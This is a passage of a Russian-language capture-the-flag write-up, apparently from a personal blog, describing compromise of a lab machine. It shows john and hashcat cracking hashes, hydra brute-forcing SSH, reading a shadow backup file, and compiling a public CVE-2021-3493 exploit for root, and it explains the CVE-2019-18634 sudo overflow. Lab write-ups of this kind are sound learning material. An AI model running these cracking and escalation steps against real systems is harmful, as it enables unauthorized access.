+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13
+</span></code></pre></td>
+<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
+<pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>$ john --wordlist<span style="color:#f92672">=</span>rockyou.txt 7z_hash.txt 
+</span></span><span style="display:flex;"><span>Using default input encoding: UTF-8
+</span></span><span style="display:flex;"><span>Loaded <span style="color:#ae81ff">1</span> password hash <span style="color:#f92672">(</span>7z, 7-Zip archive encryption <span style="color:#f92672">[</span>SHA256 256/256 AVX2 8x AES<span style="color:#f92672">])</span>
+</span></span><span style="display:flex;"><span>Cost <span style="color:#ae81ff">1</span> <span style="color:#f92672">(</span>iteration count<span style="color:#f92672">)</span> is <span style="color:#ae81ff">524288</span> <span style="color:#66d9ef">for</span> all loaded hashes
+</span></span><span style="display:flex;"><span>Cost <span style="color:#ae81ff">2</span> <span style="color:#f92672">(</span>padding size<span style="color:#f92672">)</span> is <span style="color:#ae81ff">5</span> <span style="color:#66d9ef">for</span> all loaded hashes
+</span></span><span style="display:flex;"><span>Cost <span style="color:#ae81ff">3</span> <span style="color:#f92672">(</span>compression type<span style="color:#f92672">)</span> is <span style="color:#ae81ff">2</span> <span style="color:#66d9ef">for</span> all loaded hashes
+</span></span><span style="display:flex;"><span>Cost <span style="color:#ae81ff">4</span> <span style="color:#f92672">(</span>data length<span style="color:#f92672">)</span> is <span style="color:#ae81ff">70283</span> <span style="color:#66d9ef">for</span> all loaded hashes
+</span></span><span style="display:flex;"><span>Will run <span style="color:#ae81ff">4</span> OpenMP threads
+</span></span><span style="display:flex;"><span>Press <span style="color:#e6db74">&#39;q&#39;</span> or Ctrl-C to abort, almost any other key <span style="color:#66d9ef">for</span> status
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>REDACTED<span style="color:#f92672">]</span>        <span style="color:#f92672">(</span>Journal.ctz<span style="color:#f92672">)</span>     
+</span></span><span style="display:flex;"><span>1g 0:00:01:19 DONE <span style="color:#f92672">(</span>2026-07-01 06:55<span style="color:#f92672">)</span> 0.01264g/s 70.79p/s 70.79c/s 70.79C/s spartans..inferno
+</span></span><span style="display:flex;"><span>Use the <span style="color:#e6db74">&#34;--show&#34;</span> option to display all of the cracked passwords reliably
+</span></span><span style="display:flex;"><span>Session completed. 
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Поспешим посмотреть содержимое. Открыть данный архив можно с помощью того самого приложеня Cherrytree, я вижу его, а тем-более пользуюсь им, впервые.</p>
+<p><img alt="Cherrytree" loading="lazy" src="/images/cblossom-cherrytree.webp"></p>
+<p>Внутри было что-то вроде дневника: записки сумасшедшего. Вкратце: чувак съехал с катушек и его терапевт попросила его вести дневник, ведь это может ему помочь совладать с мыслями. Но мы опустим всю трагику этой истории и сосредоточимся на добыче. Первое: автор дневника пишет о том, что ему удалось собрать список паролей, которые никто и никогда не использовал до этого, и их невозможно будет взломать. Естественно, по доброте душевной он оставил список паролей в своём дневнике. Кроме того, в одной из записей он упомянул, что его подруга, <strong>lily</strong>, выбрала себе пароль. Имя у нас есть и список тоже есть. А ещё у нас есть ssh на 22 порту, вот вам и вектор атаки. Кстати, вторая новость: в этом дневнике был флаг.</p>
+<p><img alt="FLAG" loading="lazy" src="/images/cblossom-jflag.webp"></p>
+<p>Так как у нас есть юзер, есть список, воспользуемся <strong>hydra</strong> для того, чтобы надыбать себе доступ к системе через ssh.</p>
+<div class="highlight"><div style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;">
+<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
+<pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">3
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">4
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">5
+</span></code></pre></td>
+<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
+<pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>$ hydra -l lily -P cherry-blossom.list ssh://10.113.182.130
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Hydra <span style="color:#f92672">(</span>https://github.com/vanhauser-thc/thc-hydra<span style="color:#f92672">)</span> starting at 2026-07-01 07:14:58
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>22<span style="color:#f92672">][</span>ssh<span style="color:#f92672">]</span> host: 10.113.182.130   login: lily   password: <span style="color:#f92672">[</span>REDACTED<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">1</span> of <span style="color:#ae81ff">1</span> target successfully completed, <span style="color:#ae81ff">1</span> valid password found
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>После томного ожидания получаем пароль, а следовательно, и доступ к машине по ssh.</p>
+<div class="highlight"><div style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;">
+<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
+<pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">3
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">4
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">5
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">6
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">7
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">8
+</span></code></pre></td>
+<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
+<pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>$ ssh lily@10.113.182.130
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        <span style="color:#75715e">#####################################</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#75715e">##########  Welcome, Lily  ##########</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#75715e">#####################################</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>lily@cherryblossom:~$ 
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Изначально я пытался найти что-то полезное, осуществляя первоначальное перечисление системы: смотрел getcap, искал файлы с установленными SUID, пытался просмотреть sudo -l, но ничего дельного я не нашёл. Поэтому я принялся рыскать по системе, и, на моё, удивление, когда я пошёл по привычному для себя пути в директорию <strong>/var/backups</strong>, я обнаружил там .bak файлы для passwd и shadow. И я бы прошёл мимо, если бы не заметил, что могу читать <strong>shadow.bak</strong>.</p>
+<div class="highlight"><div style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;">
+<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
+<pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">3
+</span></code></pre></td>
+<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
+<pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>lily@cherryblossom:/var/backups$ ls -la
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>-r--r--r--  <span style="color:#ae81ff">1</span> root shadow    <span style="color:#ae81ff">1481</span> Feb  <span style="color:#ae81ff">9</span>  <span style="color:#ae81ff">2020</span> shadow.bak
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Ещё изначально, когда я только осматривался в системе, в директории <strong>/home</strong> я заметил существование ещё одного пользователя: <strong>johan</strong>. Да, его хэш есть в том самом <strong>shadow.bak</strong>.</p>
+<p><img alt="Хэши" loading="lazy" src="/images/cblossom-johanpass.webp"></p>
+<p>На этот раз я решил обратиться к ещё одному своему товарищу <strong>hashcat</strong>. Для него эта задача по плечу. Использовать я решил тот же список, что и для <strong>lily</strong>.</p>
+<div class="highlight"><div style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;">
+<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
+<pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
+</span></code></pre></td>
+<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
+<pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>$ hashcat -a0 -m1800 <span style="color:#e6db74">&#39;[REDACTED_HASH]&#39;</span> cherry-blossom.list
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>После получения пароля я залогинился за <strong>johan</strong> с помощью <strong>su</strong> в сессии за <strong>lily</strong>, затем решил сразу же проверить директорию <strong>/home/johan</strong>, где, как и следовало этого ожидать, нашёл файл <strong>user.txt</strong>, в котором был заветный флаг.</p>
+<p><img alt="Флаг юзера" loading="lazy" src="/images/cblossom-userflag.webp"></p>
+<p>Конечно, это ещё не все. Не просто так в системе существует <strong>root</strong> юзер, ведь и его флаг нам тоже нужен. Дальше я долго искал хоть какие-то зацепки, куда же двигаться дальше. Прошерудив доступные файлы для чтения для <strong>johan</strong> с помощью <strong>find</strong>, его разрешения и подобные первостепенные вещи, ничего из ряда вон выходящего и не обнаружил. Всё было также чисто, как и у <strong>lily</strong>. В голову даже лезла идея вскрыть хэш в том самом <strong>shadow.bak</strong> для рут юзера, но это занимает неизвестно сколько времени, поэтому от этой идея сразу отступился.</p>
+<p>Затем я решил воспользоваться одним тулом, который сканирует систему и пытается найти, для каких экплойтов она уязвима. Если кто не в курсе, тул <strong>Linux Exploit Suggester</strong>. Тул мне показал несколько уязвимостей и даже дал ссылки на PoC для двух из них, именно поэтому на них я и сосредоточился.Я решил использовать PoC для уязвимости CVE-2021-3493.</p>
+<p><img alt="CVE-2021-3493" loading="lazy" src="/images/cblossom-exploit_1.webp"></p>
+<p>Кстати, при попытке использовать данный экспойт я столкнулся с небольшой проблемой. Дело в том, что я, как обычно, скомпилировал <strong>.c</strong> файл с помощью <strong>gcc</strong>.</p>
+<div class="highlight"><div style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;">
+<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
+<pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
+</span></code></pre></td>
+<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
+<pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>gcc exploit.c -o file_1
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Но я не задумывался о том, что атакуемая машина окажется слишком стара по сравнению с моей. Этот файл там просто не хотел запускаться. Поэтому пришлось повторно выполнить компиляцию, но с добавлением флага <strong>-static</strong>. После запуска эксплойта получилась следующая картина.</p>
+<p><img alt="Root Flag" loading="lazy" src="/images/cblossom-rootflag.webp"></p>
+<p>Как видите, удалось добыть рут флаг.</p>
+<blockquote>
+<p><strong>Примечание</strong>
+Как выяснилось позже, когда я ознакомился с райтапом самого автора, его задумка крылась в ином. На самом деле, по его задумке, нужно было воспользоваться другой уязвимостью, которую LSE мне точно также показал (именно между этой уязимостью и CVE-2021-3493 я и выбирал). Я остановился на CVE-2021-3493, потому что после того, как я прочитал информацию об этой уязвимости, и узнал, что её эксплуатация приводит к получению рут прав, я решил дальше не копать, и воспользоваться эксплойтом.
+Автор же подразумеваел в своей комнате эксплуатацию уязвимости  CVE-2019-18634.</p>
+</blockquote>
+<p>Дело в том, что при использовании sudo нужно привычным образом ввести пароль юзера. Но что непривычно, так это то, что в терминале вместо пустоты в ответ вводимым символам отображаются звездочки.</p>
+<p><img alt="PoC" loading="lazy" src="/images/cblossom-poc.webp"></p>
+<p>За это отвечает опция pwfeedback. Под вводимый пользователем пароль в оперативной памяти выделяется фиксированная ячейка определенного размера (буфер). То есть, функция должна была строго следить за переполнением этой ячейки. Но нет худа без добра. Умельцы нашли способ сломать данную проверку.</p>
+<p>Лишние вводимые данные в поле пароля выходили за границы буфера и начинали затирать соседние участки памяти. И в самом конце всей этой истории находится важная структура: <strong>Return Address</strong>. Это указатель, который по окончании функции ввода пароля диктовал дальнейшие действия. И именно здесь злоумышленники использовали свой код для выполнения.</p>
+<p>В целом, комната вышла достаточно интересной. Как я упомянал в начале, я знаком с работами этого автора на TryHackMe. Я надеюсь, что мои комментарии по ходу решения пришлись вам по душе, а самое главное, были предельно понятными. До новых встреч!</p>
+
+
+  </div>
+
+  <footer class="post-footer">
+    <ul class="post-tags">
+      <li><a href="http://localhost:1313/tags/linux/">Linux</a></li>
+    </ul>
+  </footer>
+</article>
+    </main>
+    
+<footer class="footer">
+        <span>&copy; 2026 <a href="http://localhost:1313/">.bdk writeups</a></span> · 
+
+    
+    
+    <span>
+        Powered by
+        <a href="https://gohugo.io/?utm_source=papermod" rel="noopener" target="_blank">Hugo</a> &
+        <a href="https://github.com/adityatelange/hugo-PaperMod/" rel="noopener" target="_blank">PaperMod</a>
+    </span>
+</footer>
+<a href="#top" id="top-link" class="top-link hidden" aria-label="go to top" title="Go to Top (Alt + G)" accesskey="g">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"
+        stroke-linecap="round" stroke-linejoin="round" class="feather feather-chevrons-up">
+        <polyline points="17 11 12 6 7 11"></polyline>
+        <polyline points="17 18 12 13 7 18"></polyline>
+    </svg>
+</a>
+
+<script>
+    let menu = document.getElementById('menu');
+    if (menu) {
+        
+        const scrollPosition = localStorage.getItem("menu-scroll-position");
+        if (scrollPosition) {
+            menu.scrollLeft = parseInt(scrollPosition, 10);
+        }
+        
+        menu.onscroll = function () {
+            localStorage.setItem("menu-scroll-position", menu.scrollLeft);
+        }
+    }
+
+    document.querySelectorAll('a[href^="#"]').forEach(anchor => {
+        anchor.addEventListener("click", function (e) {
+            e.preventDefault();
+            var id = this.getAttribute("href").substr(1);
+            if (!window.matchMedia('(prefers-reduced-motion: reduce)').matches) {
+                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView({
+                    behavior: "smooth"
+                });
+            } else {
+                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView();
+            }
+            if (id === "top") {
+                history.replaceState(null, null, " ");
+            } else {
+                history.pushState(null, null, `#${id}`);
+            }
+        });
+    });
+
+</script>
+<script>
+    var toplink = document.getElementById("top-link");
+    window.onscroll = function () {
+        const scrollThreshold = window.innerHeight;
+        if (document.body.scrollTop > scrollThreshold || document.documentElement.scrollTop > scrollThreshold) {
+            toplink.classList.remove("hidden");
+        } else {
+            toplink.classList.add("hidden");
+        }
+    };
+
+</script>
+<script>
+    document.getElementById("theme-toggle").addEventListener("click", () => {
+        const html = document.querySelector("html");
+        if (html.dataset.theme === "dark") {
+            html.dataset.theme = 'light';
+            localStorage.setItem("pref-theme", 'light');
+        } else {
+            html.dataset.theme = 'dark';
+            localStorage.setItem("pref-theme", 'dark');
+        }
+    })
+
+</script>
+</body>
+
+</html>
